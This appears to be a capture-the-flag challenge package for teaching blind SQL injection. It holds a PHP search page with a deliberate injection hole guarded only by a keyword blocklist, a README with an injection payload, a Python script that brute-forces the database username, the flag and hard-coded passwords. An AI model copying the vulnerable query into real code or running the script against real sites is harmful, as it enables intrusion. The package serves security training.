{
    "DB-Delete.sh": "#!/bin/bash\nmysql -u root -e \"DROP DATABASE SqliDB; DROP USER 'gigem{w3_4r3_th3_4ggi3s}'@'localhost';\"\n\n# DROP DATABASE SqliDB;\n# --Deletes the database and everything inside of it.\n\n#DROP USER 'w3_4r3_th3_4ggi3s'@'localhost';\n# --Deletes the user made for the challenge.\n",
    "DB-Gen.sh": "#!/bin/bash\nservice mysql start;\nmysql -u root -e \"CREATE DATABASE SqliDB; USE SqliDB; CREATE TABLE Search (items VARCHAR(100)); GRANT SELECT ON SqliDB.Search TO 'gigem{w3_4r3_th3_4ggi3s}'@'localhost' IDENTIFIED BY '1VmHrwxT1iuVag^@PtuDC@KEd421v9'; INSERT INTO Search (items) VALUES ('Eggs'); INSERT INTO Search (items) VALUES ('Trucks'); INSERT INTO Search (items) VALUES ('Aggies'); SET PASSWORD FOR 'root'@'localhost' = PASSWORD('4P0m8B39P8mUMOt7bxl*H41%EhEWxR');\";\n# service apache2 restart;\napache2 -D FOREGROUND;\n# service mysql start\n# Starts up the 'mysql' service on the host.\n\n# mysql -u root -e '...'\n# Starts up the mysql service as the user 'root', then executes the command\n# following the -e option.\n\n# CREATE DATABASE SqliDB;\n# Creates a database called 'SqliDB'.\n\n# USE SqliDB;\n# Set the current database being used to 'SqliDB'.\n\n# CREATE TABLE Search (items VARCHAR(100));\n# Creates a table in the database called 'Search'. It has one parameter called\n# 'items', which can take in 100 characters string.\n\n# GRANT SELECT ON SqliDB.Search TO 'w3_4r3_th3_4ggi3s'@'localhost' IDENTIFIED BY '1VmHrwxT1iuVag^@PtuDC@KEd421v9';\n# Creates the user 'w3_4r3_th3_4ggi3s' and assigns it a randomized password.\n# The user is then granted permissions to search the 'SqliDB' database.\n\n# INSERT INTO Search (items) VALUES ('Eggs');\n# Inserts the value 'Eggs' into the 'Search' table under the 'items' parameter.\n\n# INSERT INTO Search (items) VALUES ('Trucks');\n# Inserts the value 'Trucks' into the 'Search' table under the 'items' parameter.\n\n# INSERT INTO Search (items) VALUES ('Aggies');\n# Inserts the value 'Aggies' into the 'Search' table under the 'items' parameter.\n\n# SET PASSWORD FOR 'root'@'localhost' = PASSWORD('4P0m8B39P8mUMOt7bxl*H41%EhEWxR');\n# Changes the password for 'root' to a randomized one that is hashed.\n",
    "Dockerfile": "# Pulling latest Ubuntu image.\nFROM ubuntu:latest\n\n# Making it so that the CLI will not be interactive during the building of the Docker container.\nARG DEBIAN_FRONTEND=\"noninteractive\"\n\n# Installing apach2, mysql, php, and everything they need to interact.\nRUN apt-get -y update && apt-get install -y apache2 apache2-doc apache2-utils mysql-server php libapache2-mod-php php-mysql\n\n# Copying over the needed web files.\nCOPY /Website/index.html /var/www/html\nCOPY /Website/Search.php /var/www/html\nCOPY /Website/Best_Aggie.png /var/www/html\nCOPY /Website/Best_Truck.png /var/www/html\nCOPY /Website/Ehhh.png /var/www/html\nCOPY /Website/Happy_Eggs.png /var/www/html\nCOPY /Website/Nice_Going!.gif /var/www/html\nCOPY /Website/Nope.gif /var/www/html\nCOPY /Website/TAMU_CTF.png /var/www/html\n\n#Adding the Database Generation Script.\nCOPY DB-Gen.sh /\n\n# Setting the environment variables for apache2.\nENV APACHE_RUN_USER www-data\nENV APACHE_RUN_GROUP www-data\nENV APACHE_LOG_DIR /var/log/apache2\nENV APACHE_PID_FILE /var/run/apache2.pid\nENV APACHE_RUN_DIR /var/run/apache2\nENV APACHE_LOCK_DIR /var/lock/apache2\n\n# Opening up port 80 for connections.\nEXPOSE 80\n\n# Giving the generation script executable permissions.\nRUN chmod 700 /DB-Gen.sh\n\n# Upon start of the container it will launch the generation script.\nENTRYPOINT [\"./DB-Gen.sh\"]\n",
    "README.md": "\n# Blind SQL Injection\n\nObjective is for the player to use blind SQL injections to get the user account that is using the SQL table, which is the flag.\n\n## Setup\n\nInstall docker and  while in the challenge directory, run\n```\nsudo docker build -t blind-sql .\nsudo docker run blind-sql\n```\n\n## Solution\n\nThe solution requires using blind boolean sql injections to bruteforce each character of the user account name. \nHere is a general guide on using these: http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/\n\nA key injection would be\n```\n' OR substr(user(), 1, 1) = 'w';-- -\n```\nand adjusting the injection parameters as needed to brute force each character.\nA successful injection will return a gif called Nice_Going!.gif, so looking for that in the HTTP response will be key.\nI used the requests module in Python, as shown in the solution script. \n",
    "Solution_Script.py": "import requests\n\ngettingLength = True\nlength = 0\n\n#Getting the length of the username.\nwhile gettingLength:\n    lengthInjection = \"http://192.168.56.101/Search.php?Search=\\' OR length(user()) = \" + str(length) + \"; -- -\"\n\n    r = requests.get(lengthInjection)\n\n    if \"Nice_Going!\" in r.text:\n        gettingLength = False\n    else:\n        length = length + 1\n\n    if length == 100:\n        gettingLength = False\n\nusername = \"\"\ncharacters = [ 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '@', '{', '}']\n#Getting the username by iterating through the possible characters and using the SQL substr() function.\n#If the value is in the username at the location given, then it returns a successful injection.\nfor x in range(1, (length + 1)):\n    for y in characters:\n        usernameInjection = \"http://192.168.56.101/Search.php?Search=\\' OR substr(user(), \" + str(x) + \", 1) = \\'\" + str(y) + \"\\'; -- -\"\n        r = requests.get(usernameInjection)\n        if \"Nice_Going!\" in r.text:\n            username = username + str(y)\n            break\n\nprint username\n",
    "Website\\Best_Aggie.png": "[Binary file or unsupported type: png]",
    "Website\\Best_Truck.png": "[Binary file or unsupported type: png]",
    "Website\\Ehhh.png": "[Binary file or unsupported type: png]",
    "Website\\Happy_Eggs.png": "[Binary file or unsupported type: png]",
    "Website\\index.html": "<html>\n<head>\n<style>\ndiv {position: absolute; margin: auto; top: 0; right: 0; bottom: 0; left: 0;text-align: center; width: 50%; height: 50%;}\nimg{ display: block; margin-left: auto; margin-right: auto; width: 25%; height: 25%;}\n</style>\n</head>\n<body>\n\t</br>\n\t<img src='TAMU_CTF.png'>\n\t<div>\n\t\t<form action='Search.php' autocomplete='off' id='search' method='get' accept-charset='UTF-8'>\n\t\t\t<h1>Search Me!</h1>\n\t\t\t<input type=\"text\" name=\"Search\" placeholder=\"Yonder Text Goes Here\">\n\t\t\t</br>\n\t\t\t<input type=\"Submit\" value=\"Submit\" id=\"submit\">\n\t\t<form/>\n\t</div>\n</body>\n</html>\n",
    "Website\\Nice_Going!.gif": "[Binary file or unsupported type: gif]",
    "Website\\Nope.gif": "[Binary file or unsupported type: gif]",
    "Website\\Search.php": "<?php\n\nfunction sanitize($searchItem){\n\t$badInput = false;\n\t//All the commands that you don't want them to inject.\n\t$sqlCommands = array (' UNION ', ' CREATE ', ' SHOW ', ' USE ', ' DESCRIBE ', ' DROP ', ' INSERT ', ' DELETE ', ' DROP ', ' INSERT ', ' UPDATE ', ' ALTER ', ' JOIN ');\n\n\tfor($i = 0; $i < sizeof($sqlCommands); $i++){\n\t\t//Looks to see if the command appeared in the string, case-insensitive.\n\t\tif(stripos($searchItem, $sqlCommands[$i]) !== false){\n\t\t\t$badInput = true;\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn $badInput;\n}\n\necho '<html>';\necho '<head>';\necho '<style>';\necho 'img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}';\necho 'h1{ text-align: center; }';\necho '</style>';\necho '</head>';\nif(isset($_GET['Search']))\n{\n\t$badInput = false;\n\n\tif(strpos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') === false){\n\t\t$dbHost = 'localhost';\n\t\t$dbUser = 'gigem{w3_4r3_th3_4ggi3s}';\n\t\t$dbPass = '1VmHrwxT1iuVag^@PtuDC@KEd421v9';\n\t\t$db = 'SqliDB';\n\n\t\t//Creates a connection to the SQL database.\n\t\t$conn = mysqli_connect($dbHost, $dbUser, $dbPass, $db)\n\t\tor die(\"Error. Ping us so we can fix it.\");\n\n\t\t//Pulls the 'Search' value from the GET paramter.\n\t\t$searchItem = trim($_GET['Search']);\n\n\t\t//Check the input for any SQL commands we don't want them to execute.\n\t\t$badInput = sanitize($searchItem);\n\n\t\tif(!$badInput){\n\t\t\t//Creates query from user input.\n\t\t\t$sql = \"SELECT * FROM Search WHERE items = '$searchItem'\";\n\n\t\t\t//Executes query..\n\t\t\t$result = mysqli_query($conn, $sql)\n\t\t\tor die(\"<h1> Our search isn't THAT good... </h1> </br> <img src='Ehhh.png'>\");\n\n\t\t\techo '</br>';\n\t\t\t//If the injection was successful.\n\t\t\tif($result->num_rows > 1){\n\t\t\t\techo '<h1>';\n\t\t\t\techo 'Nice try, nothing to see here.';\n\t\t\t\techo '</h1>';\n\t\t\t\techo '</br>';\n\t\t\t\techo \"<img src='Nice_Going!.gif'>\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t//Displaying the pre-set values.\n\t\t\t\tif($row = mysqli_fetch_assoc($result)){\n\t\t\t\t\techo '<h1>';\n\t\t\t\t\techo $row['items'];\n\t\t\t\t\techo '</h1>';\n\t\t\t\t\techo '</br>';\n\t\t\t\t\tif(strval($row['items']) == 'Eggs'){\n\t\t\t\t\t\techo \"<img src='Happy_Eggs.png'>\";\n\t\t\t\t\t}\n\t\t\t\t\telseif(strval($row['items']) == 'Trucks'){\n\t\t\t\t\t\techo \"<img src='Best_Truck.png'>\";\n\t\t\t\t\t}\n\t\t\t\t\telseif(strval($row['items']) == 'Aggies'){\n\t\t\t\t\t\techo \"<img src='Best_Aggie.png'>\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\t//Injection failure or item not in database.\n\t\t\t\t\techo '<h1>';\n\t\t\t\t\techo \"Our search isn't THAT good...\";\n\t\t\t\t\techo '</h1>';\n\t\t\t\t\techo '</br>';\n\t\t\t\t\techo \"<img src='Ehhh.png'>\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t//Tried to use a SQL command that we don't want them to.\n\tif($badInput === true){\n\t\techo '</br>';\n\t\techo '<h1>';\n\t\techo \"Nope. Not gonna let you use that command.\";\n\t\techo '</h1>';\n\t\techo '</br>';\n\t\techo \"<img src='Nope.gif'>\";\n\t}\n\t//Closes the SQL database connection.\n\tmysql_close($conn);\n}\necho '</html>';\n\n?>\n",
    "Website\\TAMU_CTF.png": "[Binary file or unsupported type: png]",
    "category": "Web"
}